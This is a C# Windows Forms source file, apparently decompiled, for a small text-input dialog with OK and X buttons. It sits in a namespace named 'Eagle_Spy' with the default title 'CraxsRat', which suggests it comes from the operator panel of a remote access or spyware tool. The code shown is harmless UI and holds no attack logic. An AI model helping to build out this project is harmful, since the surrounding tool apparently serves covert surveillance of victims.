using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class Dialog1 : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	public string Title;

	public string TheText;

	[field: AccessedThroughProperty("Mytext")]
	internal TextBox Mytext
    ;

    [field: AccessedThroughProperty("Mytitle")]
	internal Label Mytitle
	;
    private Guna.UI2.WinForms.Guna2GradientTileButton guna2GradientTileButton1;
    private Guna.UI2.WinForms.Guna2GradientTileButton guna2GradientTileButton2;
    [field: AccessedThroughProperty("DrakeUITitlePanel1")]
	internal DrakeUITitlePanel DrakeUITitlePanel1
    ;

    public Dialog1()
	{
		base.Load += Dialog1_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.Mytext = new System.Windows.Forms.TextBox();
            this.Mytitle = new System.Windows.Forms.Label();
            this.DrakeUITitlePanel1 = new DrakeUI.Framework.DrakeUITitlePanel();
            this.guna2GradientTileButton2 = new Guna.UI2.WinForms.Guna2GradientTileButton();
            this.guna2GradientTileButton1 = new Guna.UI2.WinForms.Guna2GradientTileButton();
            this.DrakeUITitlePanel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // Mytext
            // 
            this.Mytext.BackColor = System.Drawing.Color.Black;
            this.Mytext.Font = new System.Drawing.Font("Bahnschrift SemiBold", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Mytext.ForeColor = System.Drawing.Color.White;
            this.Mytext.Location = new System.Drawing.Point(23, 36);
            this.Mytext.Multiline = true;
            this.Mytext.Name = "Mytext";
            this.Mytext.Size = new System.Drawing.Size(263, 31);
            this.Mytext.TabIndex = 1;
            // 
            // Mytitle
            // 
            this.Mytitle.BackColor = System.Drawing.Color.Transparent;
            this.Mytitle.Dock = System.Windows.Forms.DockStyle.Top;
            this.Mytitle.Font = new System.Drawing.Font("Calibri", 20F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Mytitle.ForeColor = System.Drawing.Color.Red;
            this.Mytitle.Location = new System.Drawing.Point(0, 0);
            this.Mytitle.Name = "Mytitle";
            this.Mytitle.Size = new System.Drawing.Size(324, 33);
            this.Mytitle.TabIndex = 3;
            this.Mytitle.Text = "CraxsRat";
            this.Mytitle.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            // 
            // DrakeUITitlePanel1
            // 
            this.DrakeUITitlePanel1.Controls.Add(this.guna2GradientTileButton2);
            this.DrakeUITitlePanel1.Controls.Add(this.guna2GradientTileButton1);
            this.DrakeUITitlePanel1.Controls.Add(this.Mytext);
            this.DrakeUITitlePanel1.Controls.Add(this.Mytitle);
            this.DrakeUITitlePanel1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.DrakeUITitlePanel1.FillColor = System.Drawing.Color.Black;
            this.DrakeUITitlePanel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.DrakeUITitlePanel1.ForeColor = System.Drawing.Color.White;
            this.DrakeUITitlePanel1.Location = new System.Drawing.Point(0, 0);
            this.DrakeUITitlePanel1.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.DrakeUITitlePanel1.Name = "DrakeUITitlePanel1";
            this.DrakeUITitlePanel1.RectColor = System.Drawing.Color.Red;
            this.DrakeUITitlePanel1.Size = new System.Drawing.Size(324, 107);
            this.DrakeUITitlePanel1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUITitlePanel1.StyleCustomMode = true;
            this.DrakeUITitlePanel1.TabIndex = 6;
            this.DrakeUITitlePanel1.Text = null;
            this.DrakeUITitlePanel1.TitleColor = System.Drawing.Color.Red;
            this.DrakeUITitlePanel1.TitleHeight = 0;
            this.DrakeUITitlePanel1.TitleInterval = 0;
            // 
            // guna2GradientTileButton2
            // 
            this.guna2GradientTileButton2.AutoRoundedCorners = true;
            this.guna2GradientTileButton2.BorderColor = System.Drawing.Color.Red;
            this.guna2GradientTileButton2.BorderRadius = 14;
            this.guna2GradientTileButton2.BorderThickness = 2;
            this.guna2GradientTileButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientTileButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientTileButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientTileButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientTileButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientTileButton2.FillColor = System.Drawing.Color.Maroon;
            this.guna2GradientTileButton2.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(64)))), ((int)(((byte)(0)))));
            this.guna2GradientTileButton2.Font = new System.Drawing.Font("Segoe UI Black", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2GradientTileButton2.ForeColor = System.Drawing.Color.White;
            this.guna2GradientTileButton2.Location = new System.Drawing.Point(81, 73);
            this.guna2GradientTileButton2.Name = "guna2GradientTileButton2";
            this.guna2GradientTileButton2.Size = new System.Drawing.Size(58, 31);
            this.guna2GradientTileButton2.TabIndex = 5;
            this.guna2GradientTileButton2.Text = "X";
            this.guna2GradientTileButton2.Click += new System.EventHandler(this.DrakeUIButtonIcon2_Click);
            // 
            // guna2GradientTileButton1
            // 
            this.guna2GradientTileButton1.AutoRoundedCorners = true;
            this.guna2GradientTileButton1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(255)))), ((int)(((byte)(128)))));
            this.guna2GradientTileButton1.BorderRadius = 14;
            this.guna2GradientTileButton1.BorderThickness = 2;
            this.guna2GradientTileButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientTileButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientTileButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientTileButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientTileButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientTileButton1.FillColor = System.Drawing.Color.Teal;
            this.guna2GradientTileButton1.FillColor2 = System.Drawing.Color.MediumSeaGreen;
            this.guna2GradientTileButton1.Font = new System.Drawing.Font("Segoe UI Black", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2GradientTileButton1.ForeColor = System.Drawing.Color.White;
            this.guna2GradientTileButton1.Location = new System.Drawing.Point(166, 73);
            this.guna2GradientTileButton1.Name = "guna2GradientTileButton1";
            this.guna2GradientTileButton1.Size = new System.Drawing.Size(58, 31);
            this.guna2GradientTileButton1.TabIndex = 4;
            this.guna2GradientTileButton1.Text = "OK";
            this.guna2GradientTileButton1.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // Dialog1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(324, 107);
            this.ControlBox = false;
            this.Controls.Add(this.DrakeUITitlePanel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Dialog1";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
            this.Text = "Select";
            this.TopMost = true;
            this.DrakeUITitlePanel1.ResumeLayout(false);
            this.DrakeUITitlePanel1.PerformLayout();
            this.ResumeLayout(false);

	}

	private void translateme()
	{
	}

	

	private void Cancel_Button_Click(object sender, EventArgs e)
	{
	}

	private void Dialog1_Load(object sender, EventArgs e)
	{
		Mytitle.Text = Title;
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		TheText = Mytext.Text;
		base.DialogResult = DialogResult.OK;
		Close();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.No;
		Close();
	}

  
}
